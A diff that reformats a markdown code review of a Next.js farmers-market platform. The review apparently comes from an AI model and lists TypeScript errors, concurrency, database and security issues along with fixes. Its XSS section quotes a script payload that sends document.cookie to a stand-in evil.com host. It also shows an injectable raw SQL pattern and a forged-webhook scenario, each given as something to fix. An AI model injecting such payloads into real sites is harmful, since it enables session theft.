@@ -1,5 +1,7 @@
 # 🔍 COMPREHENSIVE CODE REVIEW & FUTURE ERROR PREDICTIONS
+
 ## Farmers Market Platform - Advanced Analysis by Claude Sonnet 4.5
+
 **Generated:** January 2025
 **Review Scope:** Full codebase analysis with predictive error detection
 **Status:** 🟡 Action Required - 93 TypeScript Errors + Architectural Concerns
@@ -11,6 +13,7 @@
 ### Current Health Score: 72/100
 
 **Strengths:**
+
 - ✅ Excellent database singleton pattern (canonical `@/lib/database` import)
 - ✅ Strong TypeScript strict mode adherence (no `any` types in production code)
 - ✅ Well-structured service layer with error handling
@@ -18,6 +21,7 @@
 - ✅ Good separation of concerns (services, repositories, components)
 
 **Critical Issues:**
+
 - 🔴 **93 TypeScript compilation errors** (blocking production deployment)
 - 🟡 **Missing type definitions** in testing framework
 - 🟡 **Cart hook type mismatches** causing runtime issues
@@ -33,21 +37,25 @@
 **Location:** `src/app/page.tsx:242,245`
 
 **Error:**
+
 ```typescript
 Property 'quantityAvailable' does not exist on type Product
 ```
 
 **Impact:** 🔴 **CRITICAL** - Homepage will crash when accessing product stock
+
 - Runtime error on homepage load
 - Breaks product listing functionality
 - SEO impact (500 errors for crawler bots)
 
 **Root Cause:**
+
 - Database schema has `stock` field
 - Frontend code expects `quantityAvailable` field
 - Missing Prisma type generation or schema migration
 
 **Fix:**
+
 ```typescript
 // Option 1: Update Prisma schema to add quantityAvailable
 model Product {
@@ -62,6 +70,7 @@ const available = product.stock;
 ```
 
 **Prevention:**
+
 - Run `npx prisma generate` after schema changes
 - Add pre-commit hook to validate Prisma types
 - Use branded types for database fields
@@ -71,20 +80,24 @@ const available = product.stock;
 ### 2. Cart Hook Type Mismatch - Breaking Cart Functionality
 
 **Location:**
+
 - `src/components/features/cart/cart-badge.tsx:61`
 - `src/components/features/cart/mini-cart.tsx:37`
 
 **Error:**
+
 ```typescript
 Property 'userId' does not exist in type 'UseCartOptions'
 ```
 
 **Impact:** 🔴 **CRITICAL** - Cart functionality broken
+
 - Add to cart fails silently
 - Cart badge shows incorrect count
 - User cannot proceed to checkout
 
 **Root Cause:**
+
 ```typescript
 // useCart.ts defines:
 interface UseCartOptions {
@@ -98,6 +111,7 @@ const { cart } = useCart({ userId: session?.user?.id }); // ❌ WRONG
 ```
 
 **Fix:**
+
 ```typescript
 // src/hooks/useCart.ts
 interface UseCartOptions {
@@ -111,6 +125,7 @@ const { cart } = useCart(); // userId automatically from session
 ```
 
 **Why This Happened:**
+
 - Hook refactor removed userId parameter
 - Components not updated to match new API
 - No integration tests caught the breaking change
@@ -120,20 +135,24 @@ const { cart } = useCart(); // userId automatically from session
 ### 3. Image Component Type Safety Issues
 
 **Location:**
+
 - `src/components/images/FarmImage.tsx:34,181`
 - `src/components/images/ProductImage.tsx:25,204,351`
 
 **Error:**
+
 ```typescript
 Type 'string | undefined' is not assignable to type 'string | StaticImport'
 ```
 
 **Impact:** 🟡 **HIGH** - Image loading failures
+
 - Missing images render as broken
 - No fallback displayed
 - Poor UX for products/farms without images
 
 **Root Cause:**
+
 ```typescript
 // Props allow undefined:
 interface ImageProps {
@@ -145,6 +164,7 @@ interface ImageProps {
 ```
 
 **Fix:**
+
 ```typescript
 interface ImageProps {
   src: string | null;  // Explicit null instead of undefined
@@ -163,17 +183,20 @@ function ProductImage({ src, fallback = '/images/placeholder.jpg' }: ImageProps)
 **Location:** `src/lib/testing/**/*.ts`
 
 **Errors:**
+
 - Missing type exports (`BotModule`, `BotResult`, `EventType`)
 - Wrong enum values (`'passed'` vs `'PASSED'`)
 - Missing required properties in interfaces
 - Configuration type mismatches
 
 **Impact:** 🟡 **MEDIUM** - Testing infrastructure broken
+
 - MVP validation bot cannot run
 - E2E tests fail to compile
 - CI/CD pipeline blocked
 
 **Root Cause Analysis:**
+
 ```typescript
 // Incomplete type definitions
 // src/lib/testing/types.ts is missing exports
@@ -187,6 +210,7 @@ export type EventType = 'bot:started' | 'bot:completed' | ...;
 ```
 
 **Recommended Action:**
+
 ```bash
 # Immediate fix:
 1. Audit src/lib/testing/types.ts
@@ -208,22 +232,25 @@ export type EventType = 'bot:started' | 'bot:completed' | ...;
 **Risk Level:** 🟡 **HIGH**
 
 **Current State:**
+
 ```typescript
 // Various files access env vars without validation
 const apiKey = process.env.STRIPE_SECRET_KEY; // ❌ Might be undefined
-const dbUrl = process.env.DATABASE_URL;       // ❌ No runtime check
+const dbUrl = process.env.DATABASE_URL; // ❌ No runtime check
 ```
 
 **What Will Break:**
+
 - Stripe payments fail silently in production
 - Database connections fail at runtime
 - Email service breaks without warning
 - Monitoring/Sentry disabled if keys missing
 
 **Fix - Create Environment Schema:**
+
 ```typescript
 // src/lib/config/env.ts
-import { z } from 'zod';
+import { z } from "zod";
 
 const envSchema = z.object({
   // Database
@@ -234,9 +261,9 @@ const envSchema = z.object({
   NEXTAUTH_URL: z.string().url(),
 
   // Stripe
-  STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
-  STRIPE_PUBLISHABLE_KEY: z.string().startsWith('pk_'),
-  STRIPE_WEBHOOK_SECRET: z.string().startsWith('whsec_'),
+  STRIPE_SECRET_KEY: z.string().startsWith("sk_"),
+  STRIPE_PUBLISHABLE_KEY: z.string().startsWith("pk_"),
+  STRIPE_WEBHOOK_SECRET: z.string().startsWith("whsec_"),
 
   // Email
   SENDGRID_API_KEY: z.string().optional(),
@@ -245,7 +272,7 @@ const envSchema = z.object({
   SENTRY_DSN: z.string().url().optional(),
 
   // Feature Flags
-  NEXT_PUBLIC_ENABLE_AI: z.enum(['true', 'false']).default('false'),
+  NEXT_PUBLIC_ENABLE_AI: z.enum(["true", "false"]).default("false"),
 });
 
 export type Env = z.infer<typeof envSchema>;
@@ -254,7 +281,7 @@ export function validateEnv(): Env {
   try {
     return envSchema.parse(process.env);
   } catch (error) {
-    console.error('❌ Invalid environment variables:');
+    console.error("❌ Invalid environment variables:");
     console.error(error);
     process.exit(1);
   }
@@ -265,9 +292,10 @@ export const env = validateEnv();
 ```
 
 **Usage:**
+
 ```typescript
 // ✅ Type-safe and validated
-import { env } from '@/lib/config/env';
+import { env } from "@/lib/config/env";
 
 const stripe = new Stripe(env.STRIPE_SECRET_KEY);
 ```
@@ -279,11 +307,12 @@ const stripe = new Stripe(env.STRIPE_SECRET_KEY);
 **Risk Level:** 🟡 **MEDIUM-HIGH**
 
 **Vulnerable Code:**
+
 ```typescript
 // src/hooks/useCart.ts
 const addToCart = async (request) => {
   // Optimistic update
-  setState(prev => ({ ...prev, count: prev.count + quantity }));
+  setState((prev) => ({ ...prev, count: prev.count + quantity }));
 
   const response = await addToCartAction(request);
 
@@ -294,6 +323,7 @@ const addToCart = async (request) => {
 ```
 
 **Scenario That Will Break:**
+
 1. User clicks "Add to Cart" twice quickly
 2. First request optimistically updates count: 0 → 1
 3. Second request optimistically updates count: 1 → 2
@@ -302,13 +332,14 @@ const addToCart = async (request) => {
 6. **Result:** UI shows 2 items, database has 2 items, but actual cart might have different quantity
 
 **Fix - Add Request Deduplication:**
+
 ```typescript
 const addToCart = useCallback(
   async (request: Omit<AddToCartRequest, "userId">) => {
     // Prevent duplicate requests
     const requestKey = `add-${request.productId}`;
     if (pendingRequests.has(requestKey)) {
-      return { success: false, error: { message: 'Request in progress' } };
+      return { success: false, error: { message: "Request in progress" } };
     }
 
     pendingRequests.add(requestKey);
@@ -316,10 +347,10 @@ const addToCart = useCallback(
     try {
       // Optimistic update with version tracking
       const currentVersion = cartVersion;
-      setState(prev => ({
+      setState((prev) => ({
         ...prev,
         count: prev.count + request.quantity,
-        version: currentVersion + 1
+        version: currentVersion + 1,
       }));
 
       const response = await addToCartAction(request);
@@ -331,10 +362,10 @@ const addToCart = useCallback(
         }
       } else {
         // Revert optimistic update
-        setState(prev => ({
+        setState((prev) => ({
           ...prev,
           count: Math.max(0, prev.count - request.quantity),
-          version: currentVersion
+          version: currentVersion,
         }));
       }
 
@@ -343,7 +374,7 @@ const addToCart = useCallback(
       pendingRequests.delete(requestKey);
     }
   },
-  [userId, loadCart, toast, cartVersion]
+  [userId, loadCart, toast, cartVersion],
 );
 ```
 
@@ -354,11 +385,13 @@ const addToCart = useCallback(
 **Risk Level:** 🟡 **MEDIUM**
 
 **Current State:**
+
 - Root error boundary exists (`error.tsx`)
 - No per-route error boundaries
 - No granular component error boundaries
 
 **What Will Break:**
+
 - Single component error crashes entire page
 - User loses all form data on error
 - No graceful degradation
@@ -405,18 +438,19 @@ export default function CheckoutLayout({ children }) {
 **Risk Level:** 🟡 **MEDIUM**
 
 **Pattern Found:**
+
 ```typescript
 // src/app/actions/cart.actions.ts
 export async function addToCartAction(request: AddToCartRequest) {
   const session = await auth();
   if (!session?.user) {
-    return { success: false, error: { message: 'Unauthorized' } };
+    return { success: false, error: { message: "Unauthorized" } };
   }
 
   // ❌ No try-catch - unhandled rejections will crash server
   const result = await cartService.addToCart({
     ...request,
-    userId: session.user.id
+    userId: session.user.id,
   });
 
   return { success: true, data: result };
@@ -424,11 +458,13 @@ export async function addToCartAction(request: AddToCartRequest) {
 ```
 
 **What Happens:**
+
 - Database connection timeout → Unhandled rejection → Server crash
 - Validation error → Unhandled rejection → 500 error
 - Network error → Unhandled rejection → Vercel function timeout
 
 **Standard Server Action Pattern:**
+
 ```typescript
 export async function addToCartAction(request: AddToCartRequest) {
   try {
@@ -437,7 +473,7 @@ export async function addToCartAction(request: AddToCartRequest) {
     if (!session?.user) {
       return {
         success: false,
-        error: { code: 'UNAUTHORIZED', message: 'Please sign in' }
+        error: { code: "UNAUTHORIZED", message: "Please sign in" },
       };
     }
 
@@ -450,32 +486,31 @@ export async function addToCartAction(request: AddToCartRequest) {
     // 4. Business Logic
     const result = await cartService.addToCart({
       ...validated,
-      userId: session.user.id
+      userId: session.user.id,
     });
 
     // 5. Success Response
-    revalidatePath('/cart');
+    revalidatePath("/cart");
     return {
       success: true,
-      data: result
+      data: result,
     };
-
   } catch (error) {
     // 6. Comprehensive Error Handling
-    logger.error('Add to cart failed', {
+    logger.error("Add to cart failed", {
       error: error instanceof Error ? error.message : String(error),
       userId: session?.user?.id,
-      request
+      request,
     });
 
     if (error instanceof ZodError) {
       return {
         success: false,
         error: {
-          code: 'VALIDATION_ERROR',
-          message: 'Invalid request data',
-          details: error.flatten()
-        }
+          code: "VALIDATION_ERROR",
+          message: "Invalid request data",
+          details: error.flatten(),
+        },
       };
     }
 
@@ -484,8 +519,8 @@ export async function addToCartAction(request: AddToCartRequest) {
         success: false,
         error: {
           code: error.code,
-          message: error.message
-        }
+          message: error.message,
+        },
       };
     }
 
@@ -493,9 +528,9 @@ export async function addToCartAction(request: AddToCartRequest) {
     return {
       success: false,
       error: {
-        code: 'INTERNAL_ERROR',
-        message: 'Failed to add item to cart. Please try again.'
-      }
+        code: "INTERNAL_ERROR",
+        message: "Failed to add item to cart. Please try again.",
+      },
     };
   }
 }
@@ -510,6 +545,7 @@ export async function addToCartAction(request: AddToCartRequest) {
 **Risk Level:** 🟡 **MEDIUM** (currently working, will break under load)
 
 **The Problem:**
+
 ```typescript
 // Prisma returns Decimal objects
 const product = await database.product.findUnique(...);
@@ -520,24 +556,28 @@ const product = await database.product.findUnique(...);
 ```
 
 **Why It Works Now:**
+
 - Small dataset, objects are simple
 - Not hitting serialization edge cases
 
 **When It Will Break:**
+
 1. Complex nested objects with multiple Decimal fields
 2. Large product lists (100+ items)
 3. Server Components passing data to Client Components
 4. NextResponse.json() with Decimals
 
 **Error You'll See:**
+
 ```
 Error: Error serializing `.products[0].price` returned from `getServerSideProps`
 ```
 
 **Solution - Create Serialization Utilities:**
+
 ```typescript
 // src/lib/utils/serialization.ts
-import { Decimal } from '@prisma/client/runtime/library';
+import { Decimal } from "@prisma/client/runtime/library";
 
 export function serializeDecimal(value: Decimal | null): number | null {
   if (value === null) return null;
@@ -564,7 +604,7 @@ export function serializeDecimals<T>(obj: T): T {
     return obj.map(serializeDecimals) as unknown as T;
   }
 
-  if (typeof obj === 'object') {
+  if (typeof obj === "object") {
     const result: any = {};
     for (const [key, value] of Object.entries(obj)) {
       result[key] = serializeDecimals(value);
@@ -577,6 +617,7 @@ export function serializeDecimals<T>(obj: T): T {
 ```
 
 **Usage:**
+
 ```typescript
 // Server Component
 export default async function ProductsPage() {
@@ -596,6 +637,7 @@ export default async function ProductsPage() {
 **Risk Level:** 🟡 **MEDIUM** (will cause performance degradation)
 
 **Vulnerable Pattern:**
+
 ```typescript
 // src/hooks/useCart.ts
 useEffect(() => {
@@ -608,11 +650,13 @@ useEffect(() => {
 ```
 
 **The Hidden Problem:**
+
 - `loadCart` is async
 - Component might unmount while request is in-flight
 - Setting state on unmounted component = memory leak + warning
 
 **Fix - Add Cancellation Tokens:**
+
 ```typescript
 useEffect(() => {
   let cancelled = false;
@@ -641,7 +685,7 @@ useEffect(() => {
     } catch (error) {
       if (cancelled) return;
 
-      logger.error('Cart load error', { error });
+      logger.error("Cart load error", { error });
       setState({
         summary: null,
         count: 0,
@@ -670,6 +714,7 @@ useEffect(() => {
 **Risk Level:** 🔴 **HIGH** (will crash production under load)
 
 **Current Configuration:**
+
 ```typescript
 // src/lib/database/index.ts
 const pool = new Pool({
@@ -681,17 +726,20 @@ const pool = new Pool({
 ```
 
 **The Math:**
+
 - Vercel serverless: Up to 100 concurrent functions
 - Each function gets own database instance
 - Pool size = 5 per function
-- Total possible connections = 100 * 5 = 500 connections
+- Total possible connections = 100 \* 5 = 500 connections
 
 **PostgreSQL Default Limits:**
+
 - Free tier: 20-100 connections
 - Standard tier: 100-200 connections
 - **You'll hit connection limit under moderate load**
 
 **What Will Happen:**
+
 ```
 Error: remaining connection slots are reserved for non-replication superuser connections
 ```
@@ -699,12 +747,14 @@ Error: remaining connection slots are reserved for non-replication superuser con
 **Solutions:**
 
 **Option 1: Connection Pooler (Recommended)**
+
 ```bash
 # Use PgBouncer or Supabase Pooler
 DATABASE_URL="postgresql://user:pass@host:6543/db?pgbouncer=true"
 ```
 
 **Option 2: Reduce Pool Size**
+
 ```typescript
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
@@ -715,19 +765,20 @@ const pool = new Pool({
 ```
 
 **Option 3: Connection Monitoring**
+
 ```typescript
 // Add connection monitoring
-pool.on('connect', (client) => {
-  logger.info('DB connection established', {
+pool.on("connect", (client) => {
+  logger.info("DB connection established", {
     totalCount: pool.totalCount,
     idleCount: pool.idleCount,
-    waitingCount: pool.waitingCount
+    waitingCount: pool.waitingCount,
   });
 
   // Alert if approaching limit
   if (pool.totalCount > 15) {
-    logger.warn('Connection pool nearly exhausted', {
-      totalCount: pool.totalCount
+    logger.warn("Connection pool nearly exhausted", {
+      totalCount: pool.totalCount,
     });
   }
 });
@@ -740,6 +791,7 @@ pool.on('connect', (client) => {
 **Risk Level:** 🟡 **MEDIUM** (will cause 429 errors in production)
 
 **Current Setup:**
+
 ```typescript
 // next.config.mjs
 images: {
@@ -753,11 +805,13 @@ images: {
 ```
 
 **Vercel Limits (Pro Plan):**
+
 - 5,000 source images per month
 - Each unique image URL = 1 source image
 - Resizing = FREE (unlimited)
 
 **What Will Break:**
+
 - User uploads 100 products = 100 source images
 - 50 farmers × 100 products = 5,000 images (monthly limit hit)
 - Additional uploads = 429 Too Many Requests
@@ -765,6 +819,7 @@ images: {
 **Solutions:**
 
 **Option 1: Custom Image CDN**
+
 ```typescript
 // Use Cloudinary for optimization
 export function getOptimizedImageUrl(url: string, width: number) {
@@ -782,20 +837,21 @@ export function getOptimizedImageUrl(url: string, width: number) {
 ```
 
 **Option 2: Pre-optimize on Upload**
+
 ```typescript
 // src/lib/upload/image-processor.ts
-import sharp from 'sharp';
+import sharp from "sharp";
 
 export async function processProductImage(buffer: Buffer) {
   const sizes = [400, 800, 1200];
 
   const variants = await Promise.all(
-    sizes.map(width =>
+    sizes.map((width) =>
       sharp(buffer)
         .resize(width, null, { withoutEnlargement: true })
         .webp({ quality: 85 })
-        .toBuffer()
-    )
+        .toBuffer(),
+    ),
   );
 
   // Upload all variants to storage
@@ -803,7 +859,7 @@ export async function processProductImage(buffer: Buffer) {
   return {
     small: uploadToCloudinary(variants[0]),
     medium: uploadToCloudinary(variants[1]),
-    large: uploadToCloudinary(variants[2])
+    large: uploadToCloudinary(variants[2]),
   };
 }
 ```
@@ -815,21 +871,23 @@ export async function processProductImage(buffer: Buffer) {
 **Risk Level:** 🔴 **CRITICAL** (security vulnerability)
 
 **Current Code Review Needed:**
+
 ```typescript
 // Check if webhook verification is properly implemented
 // src/app/api/webhooks/stripe/route.ts
 ```
 
 **Common Mistake:**
+
 ```typescript
 // ❌ WRONG - Skips verification in production
 export async function POST(request: Request) {
   const body = await request.text();
 
   // Missing or disabled verification
-  if (process.env.NODE_ENV === 'development') {
+  if (process.env.NODE_ENV === "development") {
     // Only verify in dev??? NO!
-    const signature = request.headers.get('stripe-signature');
+    const signature = request.headers.get("stripe-signature");
     stripe.webhooks.constructEvent(body, signature, webhookSecret);
   }
 
@@ -840,23 +898,22 @@ export async function POST(request: Request) {
 ```
 
 **Attack Scenario:**
+
 1. Attacker sends fake webhook: `{ type: "payment_intent.succeeded" }`
 2. Your server processes it without verification
 3. Order marked as paid without actual payment
 4. Free products for attacker
 
 **Correct Implementation:**
+
 ```typescript
 export async function POST(request: Request) {
   const body = await request.text();
-  const signature = request.headers.get('stripe-signature');
+  const signature = request.headers.get("stripe-signature");
 
   if (!signature) {
-    logger.error('Missing Stripe signature');
-    return NextResponse.json(
-      { error: 'Missing signature' },
-      { status: 400 }
-    );
+    logger.error("Missing Stripe signature");
+    return NextResponse.json({ error: "Missing signature" }, { status: 400 });
   }
 
   let event: Stripe.Event;
@@ -866,21 +923,18 @@ export async function POST(request: Request) {
     event = stripe.webhooks.constructEvent(
       body,
       signature,
-      process.env.STRIPE_WEBHOOK_SECRET!
+      process.env.STRIPE_WEBHOOK_SECRET!,
     );
   } catch (err) {
-    logger.error('Webhook signature verification failed', {
-      error: err instanceof Error ? err.message : String(err)
+    logger.error("Webhook signature verification failed", {
+      error: err instanceof Error ? err.message : String(err),
     });
-    return NextResponse.json(
-      { error: 'Invalid signature' },
-      { status: 400 }
-    );
+    return NextResponse.json({ error: "Invalid signature" }, { status: 400 });
   }
 
   // Now safe to process verified event
   switch (event.type) {
-    case 'payment_intent.succeeded':
+    case "payment_intent.succeeded":
       await handlePaymentSuccess(event.data.object);
       break;
     // ...
@@ -899,14 +953,16 @@ export async function POST(request: Request) {
 **Risk Level:** 🟡 **LOW-MEDIUM** (Prisma protects most cases)
 
 **Vulnerable Pattern:**
+
 ```typescript
 // If using $queryRawUnsafe
 const result = await database.$queryRawUnsafe(
-  `SELECT * FROM "Farm" WHERE name = '${userInput}'` // ❌ DANGER
+  `SELECT * FROM "Farm" WHERE name = '${userInput}'`, // ❌ DANGER
 );
 ```
 
 **Fix:**
+
 ```typescript
 // Use $queryRaw with template literals (auto-escaped)
 const result = await database.$queryRaw`
@@ -922,18 +978,21 @@ const result = await database.$queryRaw`
 **Risk Level:** 🟡 **MEDIUM**
 
 **Vulnerable Code:**
+
 ```typescript
 // If displaying user-generated content:
 <div dangerouslySetInnerHTML={{ __html: review.comment }} /> // ❌ XSS
 ```
 
 **Attack:**
+
 ```javascript
 // User submits review:
-comment: "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
+comment: "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>";
 ```
 
 **Fix:**
+
 ```typescript
 import DOMPurify from 'isomorphic-dompurify';
 
@@ -956,6 +1015,7 @@ function ReviewComment({ comment }: { comment: string }) {
 **Location:** Likely in product listings, farm details
 
 **Example:**
+
 ```typescript
 // ❌ N+1 Query
 const products = await database.product.findMany();
@@ -963,12 +1023,13 @@ const products = await database.product.findMany();
 for (const product of products) {
   // Separate query for each product (N queries)
   const farm = await database.farm.findUnique({
-    where: { id: product.farmId }
+    where: { id: product.farmId },
   });
 }
 ```
 
 **Fix:**
+
 ```typescript
 // ✅ Single query with include
 const products = await database.product.findMany({
@@ -977,10 +1038,10 @@ const products = await database.product.findMany({
       select: {
         id: true,
         name: true,
-        slug: true
-      }
-    }
-  }
+        slug: true,
+      },
+    },
+  },
 });
 ```
 
@@ -989,6 +1050,7 @@ const products = await database.product.findMany({
 ### 17. Missing Database Indexes
 
 **Add Performance Indexes:**
+
 ```sql
 -- High-traffic queries need indexes
 CREATE INDEX CONCURRENTLY idx_products_farm_status
@@ -1018,6 +1080,7 @@ CREATE INDEX CONCURRENTLY idx_farms_search
 **Priority Order:**
 
 1. **Fix TypeScript Errors (Day 1-2)**
+
    ```bash
    # Start with critical paths
    1. Fix product quantityAvailable issue
@@ -1027,6 +1090,7 @@ CREATE INDEX CONCURRENTLY idx_farms_search
    ```
 
 2. **Add Environment Validation (Day 2)**
+
    ```bash
    # Create env.ts schema
    # Add startup validation
@@ -1034,6 +1098,7 @@ CREATE INDEX CONCURRENTLY idx_farms_search
    ```
 
 3. **Fix Database Connection Pool (Day 3)**
+
    ```bash
    # Implement PgBouncer or reduce pool size
    # Add connection monitoring
@@ -1041,6 +1106,7 @@ CREATE INDEX CONCURRENTLY idx_farms_search
    ```
 
 4. **Security Audit (Day 3-4)**
+
    ```bash
    # Verify Stripe webhook signatures
    # Audit all user input sanitization
@@ -1098,6 +1164,7 @@ npm run check-errors  # Custom script to check for common patterns
 ### Code Review Checklist
 
 **For Every PR:**
+
 - [ ] No TypeScript `any` types
 - [ ] All async functions have try-catch
 - [ ] Server Actions have error handling
@@ -1153,6 +1220,7 @@ if (paymentFailureRate > 10%) {
 ### Summary
 
 Your codebase has a **solid foundation** with excellent architectural patterns:
+
 - Database singleton ✅
 - Service layer architecture ✅
 - Error handling framework ✅
@@ -1194,6 +1262,7 @@ If you need assistance with any of these issues:
 4. **Performance:** Add database indexes as priority
 
 **Remember:**
+
 > "Code that works locally but fails in production is not working code."
 > — Every Senior Engineer Ever
 
